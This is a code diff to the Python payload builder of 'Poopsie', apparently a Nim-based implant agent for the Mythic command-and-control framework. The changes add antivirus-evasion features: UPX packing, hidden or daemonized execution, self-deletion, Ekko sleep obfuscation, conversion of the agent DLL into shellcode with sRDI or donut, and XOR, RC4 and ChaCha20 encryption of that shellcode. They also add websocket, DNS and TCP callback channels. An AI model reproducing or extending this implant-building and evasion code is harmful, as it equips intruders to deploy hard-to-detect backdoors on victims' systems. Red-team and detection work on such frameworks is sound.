@@ -10,7 +10,6 @@ from pathlib import Path
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicRPC import *
 
-# Import ShellcodeRDI for shellcode generation
 sys.path.append(str(pathlib.Path(".") / "poopsie" / "agent_code"))
 from ShellcodeRDI import ConvertToShellcode, HashFunctionName
 
@@ -31,7 +30,6 @@ class Poopsie(PayloadType):
     supports_multiple_c2_instances_in_build = False
     supports_multiple_c2_in_build = False
     
-    # Shellcode options
     shellcode_format_options = ["Binary", "Base64", "C", "CSharp", "Hex", "Ruby", "Python"]
     shellcode_bypass_options = ["None", "Abort on fail", "Continue on fail"]
     
@@ -137,12 +135,13 @@ class Poopsie(PayloadType):
                 HideCondition(name="architecture", operand=HideConditionOperand.NotEQ, value="x64")
             ],
             required=True,
+            supported_os=["Windows"],
         ),
         BuildParameter(
             name="self_delete",
             parameter_type=BuildParameterType.Boolean,
             default_value=False,
-            description="Enable self-deletion of the agent on exit (Windows only)",
+            description="Enable self-deletion of the agent on exit (Windows only). Does not work with daemonized processes.",
             required=False,
             supported_os=["Windows"],
         ),
@@ -153,9 +152,89 @@ class Poopsie(PayloadType):
             default_value=True,
             required=False,
         ),
+        BuildParameter(
+            name="payload_compression",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Payload compression option.",
+            default_value="none",
+            choices=["none", "upx"],
+            required=True,
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="Shellcode")
+            ],
+            supported_os=["Windows", "Linux"],
+        ),
+        BuildParameter(
+            name="daemonize",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Hide the console window on Windows or run the process in the background on Linux."
+            ),
+            default_value=False,
+            required=True,
+            supported_os=["Windows", "Linux"],
+        ),
+        BuildParameter(
+            name="shellcode_encryption",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Shellcode encryption option.",
+            default_value="none",
+            choices=["none", "xor_single", "xor_multi", "xor_counter", "xor_feedback", "xor_rolling", "rc4", "chacha20"],
+            required=True,
+            group_name="Shellcode Options",
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode")
+            ],
+            supported_os=["Windows"],
+        ),
+        BuildParameter(
+            name="shellcode_encryption_key",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "xor_single key example: 0xfa, xor_multi key example: MySecretKey123, xor_counter key example: MyCounterKey2024, xor_feedback key example: MyFeedbackKey!@#, xor_rolling key example: RollingKeySecret, rc4 key example: MySecretKey123, chacha20 key example: MySecret32ByteChaChaKey01234 (must be 32 bytes)"
+            ),
+            default_value="",
+            required=False,
+            group_name="Shellcode Options",
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
+                HideCondition(name="shellcode_encryption", operand=HideConditionOperand.EQ, value="none"),
+            ],
+            supported_os=["Windows"]
+        ),
+        BuildParameter(
+            name="shellcode_encryption_iv",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "xor_feedback iv example: 0xAA"
+            ),
+            default_value="",
+            required=False,
+            group_name="Shellcode Options",
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
+                HideCondition(name="shellcode_encryption", operand=HideConditionOperand.NotEQ, value="xor_feedback"),
+            ],
+            supported_os=["Windows"]
+        ),
+        BuildParameter(
+            name="shellcode_encryption_nonce",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "chacha20 nonce example: My12ByteNon (must be 12 bytes)"
+            ),
+            default_value="",
+            required=False,
+            group_name="Shellcode Options",
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode"),
+                HideCondition(name="shellcode_encryption", operand=HideConditionOperand.NotEQ, value="chacha20"),
+            ],
+            supported_os=["Windows"]
+        ),
     ]
     
-    c2_profiles = ["http"]
+    c2_profiles = ["http", "websocket", "httpx", "dns", "tcp"]
 
     c2_parameter_deviations = {
         "http": {
@@ -171,6 +250,7 @@ class Poopsie(PayloadType):
     build_steps = [
         BuildStep(step_name="Configuration", step_description="Preparing build configuration"),
         BuildStep(step_name="Compiling", step_description="Building payload with Nim"),
+        BuildStep(step_name="Compressing", step_description="Compressing payload"),
         BuildStep(step_name="Shellcode", step_description="Converting to Shellcode"),
         BuildStep(step_name="Finalizing", step_description="Packaging final payload"),
     ]
@@ -178,15 +258,12 @@ class Poopsie(PayloadType):
     async def build(self) -> BuildResponse:
         resp = BuildResponse(status=BuildStatus.Error)
         try:
-            # Get build parameters
-            selected_os = self.selected_os  # Get selected OS from Mythic
+            selected_os = self.selected_os
             
             resp.build_message += f"Building Nim payload for {selected_os}...\n"
 
-            # Set file extension based on OS and output type
             output_type = self.get_parameter("output_type")
             
-            # Validate output type for OS
             if selected_os == "Linux" and output_type in ["Service", "Shellcode"]:
                 resp.build_message += f"Linux builds do not support output type: {output_type}\n"
                 resp.status = BuildStatus.Error
@@ -197,41 +274,49 @@ class Poopsie(PayloadType):
                     self.file_extension = "dll"
                 elif output_type == "Shellcode":
                     self.file_extension = "bin"
-                else:  # Executable or Service
+                else:
                     self.file_extension = "exe"
             else:
                 if output_type == "DLL":
-                    self.file_extension = "so"  # Shared library for Linux
+                    self.file_extension = "so"
                 else:
                     self.file_extension = "bin"
 
-            # Prepare environment variables for build (like oopsie does)
             c2 = self.c2info[0]
             profile = c2.get_c2profile()["name"]
 
-            # Get all C2 parameters and add UUID like oopsie does
             c2_params = c2.get_parameters_dict()
             c2_params["UUID"] = self.uuid
             c2_params["profile"] = profile
+            
+            if profile.lower() == "websocket":
+                tasking_type = c2_params.get("tasking_type", "").lower()
+                if tasking_type == "push":
+                    resp.build_message += "Error: WebSocket profile only supports 'Poll' tasking mode. 'Push' mode is not implemented.\n"
+                    resp.build_message += "Please select 'Poll' as the tasking type in the WebSocket C2 profile configuration.\n"
+                    resp.status = BuildStatus.Error
+                    return resp
 
-            # Add build parameters
             c2_params["output_type"] = self.get_parameter("output_type")
-            c2_params["debug"] = str(self.get_parameter("debug"))
-            c2_params["sleep_obfuscation"] = self.get_parameter("sleep_obfuscation")
+            
+            architecture = self.get_parameter("architecture")
+            sleep_obfuscation = self.get_parameter("sleep_obfuscation")
+            if architecture == "x86" and sleep_obfuscation == "ekko":
+                c2_params["sleep_obfuscation"] = "none"
+            else:
+                c2_params["sleep_obfuscation"] = sleep_obfuscation
+            
             c2_params["self_delete"] = str(self.get_parameter("self_delete"))
             
-            # Add service name for service builds
             if output_type == "Service":
                 service_name = self.get_parameter("service_name")
                 if not service_name:
                     service_name = "PoopsieService"
                 c2_params["SERVICE_NAME"] = service_name
 
-            # Build environment from c2_params - convert all to env format
             build_env = {}
             for key, val in c2_params.items():
                 if isinstance(val, str):
-                    # Handle raw_c2_config specially - fetch file content like oopsie
                     if key == "raw_c2_config":
                         response = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(val))
                         if response.Success:
@@ -247,16 +332,12 @@ class Poopsie(PayloadType):
                             resp.build_message = "Failed to get raw C2 config file"
                             resp.status = BuildStatus.Error
                             return resp
-                    # Sanitize all string values (strip whitespace)
                     build_env[key.upper()] = val.strip()
                 elif isinstance(val, (int, bool)):
                     build_env[key.upper()] = str(val)
                 elif isinstance(val, dict):
-                    # Store all dicts as JSON (headers, raw_c2_config, etc.)
-                    # Java will parse the headers JSON and extract all headers including User-Agent
                     build_env[key.upper()] = json.dumps(val)
                 elif isinstance(val, list):
-                    # Handle lists (like callback_domains for httpx)
                     build_env[key.upper()] = json.dumps(val)
                 else:
                     build_env[key.upper()] = str(val)
@@ -268,18 +349,19 @@ class Poopsie(PayloadType):
                 StepSuccess=True
             ))
 
-            # Add build environment to message for visibility
             resp.build_message += "\nBuild Configuration:\n"
             for key, value in build_env.items():
-                # Mask UUID for security
                 display_value = value
                 resp.build_message += f"  {key}: {display_value}\n"
             resp.build_message += "\n"
 
-            # Build Nim agent
             output_type = self.get_parameter("output_type")
             resp.build_message += f"Compiling Nim agent ({output_type}) for {selected_os}...\n"
             build_result = await self.run_nim_build(selected_os, output_type, build_env)
+            
+            if "messages" in build_result:
+                for msg in build_result["messages"]:
+                    resp.build_message += msg + "\n"
             
             if not build_result["success"]:
                 resp.build_message += f"\nNim build failed: {build_result['error']}\n"
@@ -298,15 +380,53 @@ class Poopsie(PayloadType):
                 StepStdout=f"Successfully compiled Nim agent for {selected_os}",
                 StepSuccess=True
             ))
-            resp.build_message += f"Build command: {build_result['command']}\n"
+            resp.build_message += f"Build command:\n{build_result['command']}\n"
+
             output_path = build_result["path"]
 
-            # Handle shellcode generation if needed
+            payload_compression = self.get_parameter("payload_compression")
+            if not (output_type == "Shellcode" and selected_os == "Windows"):
+                strip_cmd = f"strip {output_path}"
+                proc = await asyncio.create_subprocess_shell(
+                    strip_cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                stdout, stderr = await proc.communicate()
+                if proc.returncode != 0:
+                    resp.build_message += f"[strip] {strip_cmd} failed: {stderr.decode()}\n"
+                    resp.status = BuildStatus.Error
+                    return resp
+                if payload_compression == "upx":
+                    upx_cmd = f"/upx --best --lzma {output_path}"
+                    proc = await asyncio.create_subprocess_shell(
+                        upx_cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                    )
+                    stdout, stderr = await proc.communicate()
+                    if proc.returncode != 0:
+                        resp.build_message += f"[upx] {upx_cmd} failed: {stderr.decode()}\n"
+                        resp.status = BuildStatus.Error
+                        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                            PayloadUUID=self.uuid,
+                            StepName="Compressing",
+                            StepStdout=f"UPX compression failed: {stderr.decode()}",
+                            StepSuccess=False
+                        ))
+                        return resp
+
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Compressing",
+                        StepStdout=f"Successfully compressed payload with UPX",
+                        StepSuccess=True
+                    ))
+
+                    resp.build_message += f"Successfully compressed payload with UPX\n"
+
             if output_type == "Shellcode" and selected_os == "Windows":
                 resp.build_message += "Converting to shellcode...\n"
-                
-                # For shellcode, we need to compile as DLL first
-                # Recompile with DLL flags
                 dll_build_result = await self.run_nim_build(selected_os, "DLL", build_env)
                 if not dll_build_result["success"]:
                     resp.build_message += f"\nDLL build for shellcode failed: {dll_build_result['error']}\n"
@@ -320,11 +440,21 @@ class Poopsie(PayloadType):
                     return resp
                 
                 dll_path = dll_build_result["path"]
-                
-                # Generate shellcode using selected tool
+                strip_cmd = f"strip {dll_path}"
+                proc = await asyncio.create_subprocess_shell(
+                    strip_cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                stdout, stderr = await proc.communicate()
+                if proc.returncode != 0:
+                    resp.build_message += f"[strip DLL] {strip_cmd} failed: {stderr.decode()}\n"
+                    resp.status = BuildStatus.Error
+                    return resp
+
                 tool = self.get_parameter("tool")
+                command = ""
                 if tool == "sRDI":
-                    # Use sRDI
                     with open(dll_path, "rb") as f:
                         dll_bytes = f.read()
                     flags = int(self.get_parameter("sRDI_flags"), 16) if self.get_parameter("sRDI_flags") else 0
@@ -332,22 +462,19 @@ class Poopsie(PayloadType):
                     output_path = self.agent_code_path / "src" / "poopsie.bin"
                     with open(output_path, "wb") as f:
                         f.write(shellcode)
+                    command = "ConvertToShellcode(dll_bytes, HashFunctionName(\"entrypoint\"), flags=flags)"
                     resp.build_message += f"Successfully converted to shellcode using sRDI (flags={hex(flags)})\n"
                 else:
-                    # Use donut
                     output_path = self.agent_code_path / "src" / "poopsie.bin"
                     shellcode_format = self.shellcode_format_options.index(self.get_parameter('shellcode_format')) + 1
                     shellcode_bypass = self.shellcode_bypass_options.index(self.get_parameter('shellcode_bypass')) + 1
-                    
                     command = f"/donut -x3 -k2 -m entrypoint -o {output_path} -i {dll_path} -f{shellcode_format} -b{shellcode_bypass}"
-                    
                     proc = await asyncio.create_subprocess_shell(
                         command,
                         stdout=asyncio.subprocess.PIPE,
                         stderr=asyncio.subprocess.PIPE,
                     )
                     stdout, stderr = await proc.communicate()
-                    
                     if proc.returncode != 0:
                         resp.build_message += f"Donut shellcode generation failed\nSTDOUT: {stdout.decode()}\nSTDERR: {stderr.decode()}\n"
                         resp.status = BuildStatus.Error
@@ -363,11 +490,20 @@ class Poopsie(PayloadType):
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                     PayloadUUID=self.uuid,
                     StepName="Shellcode",
-                    StepStdout="Successfully converted to shellcode",
+                    StepStdout="Successfully converted to shellcode\nCommand:\n{}".format(command),
                     StepSuccess=True
                 ))
 
-            # Read the final payload
+                # encrypt shellcode if requested
+                if self.get_parameter("shellcode_encryption") != "none" and self.get_parameter("shellcode_format") == "Binary":
+                    resp.build_message += f"Encrypting shellcode...using {self.get_parameter('shellcode_encryption')}...\n"
+                    try:
+                        output_path = self.encrypt(output_path)
+                    except Exception as e:
+                        resp.build_message += f"Shellcode encryption failed: {str(e)}\n"
+                        resp.status = BuildStatus.Error
+                        return resp
+
             resp.build_message += "Reading final payload...\n"
             with open(output_path, "rb") as f:
                 resp.payload = f.read()
@@ -380,9 +516,8 @@ class Poopsie(PayloadType):
             ))
 
             resp.status = BuildStatus.Success
-            resp.build_message += f"\n✓ Successfully built Nim payload for {selected_os}\n"
+            resp.build_message += f"\nSuccessfully built Nim payload for {selected_os}\n"
 
-            # Adjust filename based on OS
             if self.get_parameter("adjust_filename"):
                 resp.updated_filename = self.adjust_file_name(self.filename, selected_os)
 
@@ -395,42 +530,114 @@ class Poopsie(PayloadType):
     async def run_nim_build(self, selected_os: str, output_type: str, build_env: dict) -> dict:
         """Compile Nim agent with environment variables"""
         try:
-            # Set up environment
+            build_messages = []
+            
             env = os.environ.copy()
             env.update(build_env)
             
-            # Get architecture selection
             architecture = self.get_parameter("architecture")
             nim_cpu = "amd64" if architecture == "x64" else "i386"
             
-            # Determine target OS for cross-compilation
-            nim_args = [
-                "-d:release",
-                "--opt:size",
-                "--mm:orc",                    # Use ORC memory management (default in Nim 2.0+)
-                "--panics:on",                 # Use panics instead of exceptions (smaller binary)
-                "--passC:-flto",               # Link-time optimization (smaller binary)
-                "--passL:-flto",               # Link-time optimization
-                "--passL:-s",                  # Strip symbols (smaller binary)
-                "--d:strip",                   # Strip debug info
-                "--d:useMalloc",               # Use system malloc (smaller)
-                "--parallelBuild:0",           # Auto-detect CPU cores for faster compilation
-                "--threads:on",                # Enable threading support (required for PTY)
-            ]
+            encrypted_exchange = build_env.get("ENCRYPTED_EXCHANGE_CHECK", "").strip().upper()
+            callback_host = build_env.get("CALLBACK_HOST", "").lower()
+            profile = build_env.get("PROFILE", "").lower()
             
-            # Add DLL-specific compilation flags
+            needs_openssl_for_exchange = encrypted_exchange in ["T", "TRUE"]
+            
+            if selected_os == "Windows":
+                needs_openssl_for_transport = False
+            else:
+                needs_openssl_for_transport = (
+                    callback_host.startswith("https://") or 
+                    callback_host.startswith("wss://") or
+                    (profile == "websocket" and callback_host.startswith("wss://"))
+                )
+            
+            use_openssl = needs_openssl_for_exchange or needs_openssl_for_transport
+            
+            nim_args = [
+                "--opt:size",
+                "--mm:orc",
+                "--panics:on",
+                "--passC:-flto",
+                "--passL:-flto",
+                "--passL:-s",
+                "--d:strip",
+                "--d:useMalloc",
+                "--parallelBuild:0",
+                "--threads:on",
+            ]
+
+            if not self.get_parameter("debug"):
+                nim_args.append("-d:release")
+            else:
+                build_messages.append("Debug mode enabled (includes debug symbols)")
+
+            if output_type == "Executable" and self.get_parameter("daemonize"):
+                nim_args.append("-d:daemonize")
+            
+            if selected_os == "Windows":
+                if self.get_parameter("self_delete"):
+                    nim_args.append("-d:selfDelete")
+                if architecture == "x64":
+                    if self.get_parameter("sleep_obfuscation") == "ekko":
+                        nim_args.append("-d:sleepObfuscationEkko")
+
+            if use_openssl:
+                if selected_os == "Windows":
+                    if architecture == "x64":
+                        openssl_path = "/opt/openssl-mingw64-static"
+                        openssl_lib = f"{openssl_path}/lib64"
+                    else:
+                        openssl_path = "/opt/openssl-mingw32-static"
+                        openssl_lib = f"{openssl_path}/lib"
+                    
+                    nim_args.extend([
+                        "-d:staticOpenSSL",
+                        f"--passC:-I{openssl_path}/include",
+                        "--dynlibOverride:ssl",
+                        "--dynlibOverride:crypto",
+                        f"--passL:{openssl_lib}/libssl.a",
+                        f"--passL:{openssl_lib}/libcrypto.a",
+                        "--passL:-lws2_32",
+                        "--passL:-lcrypt32",
+                        "--passL:-lbcrypt",
+                        "--passL:-ladvapi32",
+                    ])
+                    
+                    build_messages.append(f"Static OpenSSL 3.5.4 enabled ({architecture}, RSA key exchange, no DLL dependencies)")
+                elif selected_os == "Linux":
+                    nim_args.extend([
+                        "-d:ssl",
+                    ])
+                    if needs_openssl_for_exchange and needs_openssl_for_transport:
+                        build_messages.append("Dynamic OpenSSL enabled (HTTPS/WSS transport + RSA key exchange)")
+                    elif needs_openssl_for_exchange:
+                        build_messages.append("Dynamic OpenSSL enabled (RSA key exchange, requires libssl.so on target)")
+                    else:
+                        build_messages.append("Dynamic OpenSSL enabled (HTTPS/WSS transport)")
+                    build_messages.append("  Note: Target system must have OpenSSL 1.1+ or 3.x installed")
+            else:
+                if selected_os == "Windows":
+                    build_messages.append("AESPSK mode (no RSA)")
+                else:
+                    build_messages.append("AESPSK mode (no RSA, standard httpclient)")
+            
+            if selected_os == "Windows":
+                if callback_host.startswith("https://") or callback_host.startswith("wss://"):
+                    build_messages.append("Custom WinHTTP client (native Windows API for HTTPS/WSS transport, no DLLs)")
+            
             if output_type == "DLL":
                 nim_args.extend([
-                    "--app:lib",               # Build as shared library
-                    "--nomain",                # Don't generate main entry point
-                    "-d:dll",                  # Define dll compilation flag
+                    "--app:lib",
+                    "--nomain",
+                    "-d:dll",
                 ])
             elif output_type == "Service":
                 nim_args.extend([
-                    "-d:service",              # Define service compilation flag
+                    "-d:service",
                 ])
             if selected_os == "Windows":
-                # Cross-compile for Windows using MinGW
                 if architecture == "x64":
                     nim_args.extend([
                         "--os:windows",
@@ -438,43 +645,34 @@ class Poopsie(PayloadType):
                         "--cc:gcc",
                         "--gcc.exe:x86_64-w64-mingw32-gcc",
                         "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
-                        "--passL:-static"          # Static link to avoid MinGW DLL dependencies
+                        "--passL:-static"
                     ])
-                else:  # x86
+                else:
                     nim_args.extend([
                         "--os:windows",
                         "--cpu:i386",
                         "--cc:gcc",
                         "--gcc.exe:i686-w64-mingw32-gcc",
                         "--gcc.linkerexe:i686-w64-mingw32-gcc",
-                        "--passL:-static"          # Static link to avoid MinGW DLL dependencies
+                        "--passL:-static"
                     ])
                 if output_type == "DLL":
                     output_name = "poopsie.dll"
                 else:
-                    output_name = "poopsie.exe"  # Service and Executable both output .exe
+                    output_name = "poopsie.exe"
             elif selected_os == "Linux":
-                nim_args.extend(["--os:linux", f"--cpu:{nim_cpu}"])
-                output_name = "libpoopsie.so" if output_type == "DLL" else "poopsie"
-            elif selected_os == "MacOS":
-                # Can't cross-compile to macOS, build for Linux instead
                 nim_args.extend(["--os:linux", f"--cpu:{nim_cpu}"])
                 output_name = "libpoopsie.so" if output_type == "DLL" else "poopsie"
             else:
                 output_name = "libpoopsie.so" if output_type == "DLL" else "poopsie"
             
-            # Build command: nim c directly (faster than nimble for rebuilds)
-            # Note: Dependencies should already be installed via nimble install in Dockerfile
             cmd_args = ["nim", "c"] + nim_args + ["src/poopsie.nim"]
             
-            # Enable ccache for faster recompilation (if available)
             if os.path.exists("/usr/lib/ccache"):
                 env["PATH"] = f"/usr/lib/ccache:{env.get('PATH', '')}"
             
-            # Build the command string for display (escape quotes in values for shell)
             env_parts = []
             for k, v in build_env.items():
-                # Escape single quotes by replacing ' with '\''
                 escaped_value = str(v).replace("'", "'\\''")
                 env_parts.append(f"{k}='{escaped_value}'")
             env_str = ' '.join(env_parts)
@@ -496,41 +694,48 @@ class Poopsie(PayloadType):
                 return {
                     "success": False,
                     "error": f"Nim compilation failed with code {process.returncode}\n\nSTDOUT:\n{stdout_text}\n\nSTDERR:\n{stderr_text}",
-                    "command": command
+                    "command": command,
+                    "messages": build_messages
                 }
             
-            # Check if output file exists (compiled binary is in src/ directory)
             output_path = self.agent_code_path / "src" / output_name
             if not output_path.exists():
                 return {
                     "success": False,
                     "error": f"Compiled binary not found at {output_path}",
-                    "command": command
+                    "command": command,
+                    "messages": build_messages
                 }
             
             return {
                 "success": True,
                 "path": output_path,
-                "command": command
+                "command": command,
+                "messages": build_messages
             }
             
         except asyncio.TimeoutError:
-            return {"success": False, "error": "Build timeout (exceeded 5 minutes)", "command": command}
+            return {"success": False, "error": "Build timeout (exceeded 5 minutes)", "command": ""}
         except Exception as e:
-            return {"success": False, "error": str(e), "command": "nimble c -y -d:release --opt:size src/poopsie.nim"}
+            return {"success": False, "error": str(e), "command": ""}
     
     def adjust_file_name(self, filename, selected_os):
         """Adjust filename based on OS and output type"""
         filename_pieces = filename.split(".")
         original_filename = ".".join(filename_pieces[:-1])
         output_type = self.get_parameter("output_type")
+        architecture = self.get_parameter("architecture")
+        
+        arch_suffix = f"_{architecture}"
+        if not original_filename.endswith(arch_suffix):
+            original_filename += arch_suffix
         
         if selected_os == "Windows":
             if output_type == "DLL":
                 return original_filename + ".dll"
             elif output_type == "Shellcode":
                 return original_filename + ".bin"
-            else:  # Executable or Service
+            else:
                 return original_filename + ".exe"
         else:
             if output_type == "DLL":
@@ -538,4 +743,150 @@ class Poopsie(PayloadType):
             else:
                 return original_filename + ".bin"
 
+    def parse_key(self, key_str):
+        """Parse key from string (hex, decimal, or plain text)"""
+        key_str = key_str.strip()
+        
+        if key_str.startswith("0x") or key_str.startswith("0X"):
+            return bytes([int(key_str, 16)])
+        elif all(c in "0123456789abcdefABCDEF" for c in key_str):
+            return bytes([int(key_str, 16)])
+        elif key_str.isdigit():
+            return bytes([int(key_str, 10)])
+        elif len(key_str) == 1:
+            return key_str.encode()
+        else:
+            return key_str.encode()
 
+    def encrypt(self, payload_path):
+        encrypted_path = str(payload_path) + ".enc"
+        encryption_type = self.get_parameter("shellcode_encryption")
+        key_str = self.get_parameter("shellcode_encryption_key").strip()
+        shellcode = b""
+        
+        if encryption_type == "xor_single" or encryption_type == "xor_multi":
+            key = self.parse_key(key_str)
+            
+            with open(payload_path, "rb") as f:
+                shellcode = f.read()
+            shellcode = bytearray(shellcode)
+            
+            for i in range(len(shellcode)):
+                shellcode[i] ^= key[i % len(key)]
+        
+        elif encryption_type == "xor_counter":
+            key = self.parse_key(key_str)
+            
+            with open(payload_path, "rb") as f:
+                shellcode = f.read()
+            shellcode = bytearray(shellcode)
+            
+            keylen = len(key)
+            for i in range(len(shellcode)):
+                shellcode[i] ^= key[i % keylen] ^ (i & 0xFF)
+        
+        elif encryption_type == "xor_feedback":
+            key = self.parse_key(key_str)
+            
+            # Get IV - check for None first
+            iv_param = self.get_parameter("shellcode_encryption_iv")
+            if iv_param is None:
+                raise Exception("IV parameter is required for xor_feedback encryption")
+            
+            iv_str = iv_param.strip() if isinstance(iv_param, str) else str(iv_param)
+            if not iv_str or iv_str == "":
+                raise Exception("IV cannot be empty for xor_feedback encryption")
+            
+            if iv_str.startswith("0x") or iv_str.startswith("0X"):
+                iv = int(iv_str, 16)
+            else:
+                iv = int(iv_str, 10)
+            
+            with open(payload_path, "rb") as f:
+                shellcode = f.read()
+            
+            encrypted = bytearray()
+            prev = iv & 0xFF
+            keylen = len(key)
+            
+            for i, b in enumerate(shellcode):
+                ciphertext = b ^ key[i % keylen] ^ prev
+                encrypted.append(ciphertext)
+                prev = ciphertext
+            
+            shellcode = encrypted
+        
+        elif encryption_type == "xor_rolling":
+            key = self.parse_key(key_str)
+            
+            with open(payload_path, "rb") as f:
+                shellcode = f.read()
+            
+            keylen = len(key)
+            rolling_key = 0
+            
+            for k in key:
+                rolling_key ^= k
+            
+            encrypted = bytearray()
+            for i, b in enumerate(shellcode):
+                encrypted.append(b ^ key[i % keylen] ^ (rolling_key & 0xFF))
+                rolling_key = (rolling_key * 7 + 13) & 0xFF
+            
+            shellcode = encrypted
+        
+        elif encryption_type == "rc4":
+            from Crypto.Cipher import ARC4
+            
+            key = self.parse_key(key_str)
+            
+            with open(payload_path, "rb") as f:
+                shellcode = f.read()
+            
+            cipher = ARC4.new(key)
+            shellcode = cipher.encrypt(shellcode)
+        
+        elif encryption_type == "chacha20":
+            from Crypto.Cipher import ChaCha20
+            
+            key = self.parse_key(key_str)
+            
+            # Ensure key is exactly 32 bytes
+            if len(key) < 32:
+                key = key.ljust(32, b'\x00')
+            elif len(key) > 32:
+                key = key[:32]
+            
+            # Get nonce - check for None first
+            nonce_param = self.get_parameter("shellcode_encryption_nonce")
+            if nonce_param is None:
+                raise Exception("Nonce parameter is required for chacha20 encryption")
+            
+            nonce_str = nonce_param.strip() if isinstance(nonce_param, str) else str(nonce_param)
+            if not nonce_str or nonce_str == "":
+                raise Exception("Nonce cannot be empty for chacha20 encryption")
+            
+            nonce = nonce_str.encode() if isinstance(nonce_str, str) else nonce_str
+            
+            # Ensure nonce is exactly 12 bytes
+            if len(nonce) < 12:
+                nonce = nonce.ljust(12, b'\x00')
+            elif len(nonce) > 12:
+                nonce = nonce[:12]
+            
+            with open(payload_path, "rb") as f:
+                shellcode = f.read()
+            
+            cipher = ChaCha20.new(key=key, nonce=nonce)
+            shellcode = cipher.encrypt(shellcode)
+        
+        else:
+            raise Exception(f"Unsupported encryption type: {encryption_type}")
+        
+        # Write encrypted payload
+        if shellcode:
+            with open(encrypted_path, "wb") as f:
+                f.write(shellcode)
+            return encrypted_path
+        
+        raise Exception("Failed to encrypt payload - no shellcode generated")
